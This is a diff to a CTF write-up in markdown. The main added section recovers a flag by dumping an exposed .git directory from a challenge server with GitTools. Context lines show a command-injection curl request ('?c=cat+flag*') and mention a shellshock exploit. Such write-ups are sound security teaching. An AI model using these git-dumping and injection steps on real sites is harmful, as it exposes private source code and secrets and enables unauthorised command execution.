@@ -36,6 +36,81 @@ curl http://jh2i.com:50001/?c=cat+flag*
 
 LLS{you_really_can_see_in_the_dark}
 ```
+### Dairy Products
+In this challenge, we need to find the flag from github repository that we found on the website. There was a hint about `git` when they mention `git milk`. so quickly found: `http://142.93.3.19:50008/.git/`
+
+I used [GitTools](https://github.com/yaserfaraj/GitTools) tool for dumping and extracting the flag.
+
+```bash
+*[master]yas3r@linux[~/Misc/GitTools/]$ bash gitdumper.sh http://142.93.3.19:50008/.git/ DailyGit
+```
+
+Now the extracting part.
+
+```bash
+*[master]yas3r@linux[~/Misc/GitTools/Extractor]$ bash extractor.sh ../DailyGit extractedGit        
+###########
+# Extractor is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+[*] Destination folder does not exist
+[*] Creating...
+[+] Found commit: 407ee1e114b3f10b864aa0764293b1039d876e0a
+[+] Found file: /home/yas3r/Misc/GitTools/Extractor/extractedGit/0-407ee1e114b3f10b864aa0764293b1039d876e0a/.gitignore
+[+] Found file: /home/yas3r/Misc/GitTools/Extractor/extractedGit/0-407ee1e114b3f10b864aa0764293b1039d876e0a/Dockerfile
+[+] Found file: /home/yas3r/Misc/GitTools/Extractor/extractedGit/0-407ee1e114b3f10b864aa0764293b1039d876e0a/README.md
+** deleted **
+```
+
+Now lets check the extracted folders and files
+
+```bash
+*[master]yas3r@linux[~/Misc/GitTools/Extractor]$ ls
+extractedGit  extractor.sh  README.md
+*[master]yas3r@linux[~/Misc/GitTools/Extractor]$ cd extractedGit       
+*[master]yas3r@linux[~/Misc/GitTools/Extractor/extractedGit]$ ls
+0-407ee1e114b3f10b864aa0764293b1039d876e0a   1-734ec13ba42edb6130fcd2eb26a044875c7c018a   4-7ad6d8758fc5e27a5974275c8d6c89edf432f1d9
+10-a3d2dfd4bf2e97425c2f5f5000108e43a6bb0fd5  17-9ea1b31fada5675359ddbe92ce80851f34b1553f  5-1346fb299c593ec291dd02ba38b5ef308ee66b29
+11-a3ede7423d4140d083d4e25e11e3e9f429de64e6  18-a066953506267e2fe273ca8e58790e508ebbe290  6-673101cf387cec3f3e0c7816e1324af314688ae7
+12-d5845df0e676ced23247ed2b934462400767c724  19-fa3470c0da847ddba10fa5cd30a3129ffb7e9604  7-dd99ef0b484d9eebca40beb6e1df3bb972cf94f2
+13-2812822ab38f07b1d200e0a5172d8a49ac68543f  20-b45cc8d45c71ad49a965fdfd6c03c1bd04063f37  8-8efff4abc4cf3e02eaf07c2b37264bf907303167
+14-60a8c9ab8e13fcb22355c60dfb0efff67fb68b40  21-0dae466db584768f183af5a663e5f4bc6564ac56  9-b7bbbfb4ab85fc6d303855edbbd507df5e3aedc5
+15-cf5cc68dad2391decfdcdaebcfd2a9c0afe8e51e  2-4cbe2b9dcbdbdbdcc2247454558b44142c0910f3
+16-949926e898e398c6e9c98d17c33ad61e2838c58b  3-199a59c447b65a5b77ba499b5ce94856cb29815a
+```
+Lets find the `flag.txt`
+```sh
+*[master]yas3r@linux[~/Misc/GitTools/Extractor/extractedGit]$ find . | grep flag.txt                     
+./4-7ad6d8758fc5e27a5974275c8d6c89edf432f1d9/flag.txt
+./6-673101cf387cec3f3e0c7816e1324af314688ae7/flag.txt
+./2-4cbe2b9dcbdbdbdcc2247454558b44142c0910f3/flag.txt
+./7-dd99ef0b484d9eebca40beb6e1df3bb972cf94f2/flag.txt
+./3-199a59c447b65a5b77ba499b5ce94856cb29815a/flag.txt
+./17-9ea1b31fada5675359ddbe92ce80851f34b1553f/flag.txt
+./1-734ec13ba42edb6130fcd2eb26a044875c7c018a/flag.txt
+./0-407ee1e114b3f10b864aa0764293b1039d876e0a/flag.txt
+./11-a3ede7423d4140d083d4e25e11e3e9f429de64e6/flag.txt
+./16-949926e898e398c6e9c98d17c33ad61e2838c58b/flag.txt
+./12-d5845df0e676ced23247ed2b934462400767c724/flag.txt
+*[master]yas3r@linux[~/Misc/GitTools/Extractor/extractedGit]$ for i in $(find . | grep flag.txt);do cat $i;done
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+LLS{you_gitm_gotm_good_partner}
+*[master]yas3r@linux[~/Misc/GitTools/Extractor/extractedGit]$
+```
+
 
 ### Crush : Web Challenge
 It was a hint in the website about this vulnerability, then found the `crush.sh` file. It is seems to be a `shellshock exploit`
@@ -80,7 +155,7 @@ yas3r@linux[~/CTF/VirSecCon]$ echo PD9waHAKCWVjaG8oZGF0ZSgiaDppOnMgQSIpKTsKPz4=|
 <?php
 	echo(date("h:i:s A"));
 ?>%                                                                                                       ```
-
+```
 Spend time here to find something and trying to guessing the flag but then checked the description again and the hint in the `hotaccess`. So lets read the `.htaccess`. First try was not going well since the hidden `directory` embedded into the page and it wasn't showing in the front page. because we are dealing with `apache`. However, if we check the source code or send a request using `curl` we found it.
 
 ```sh
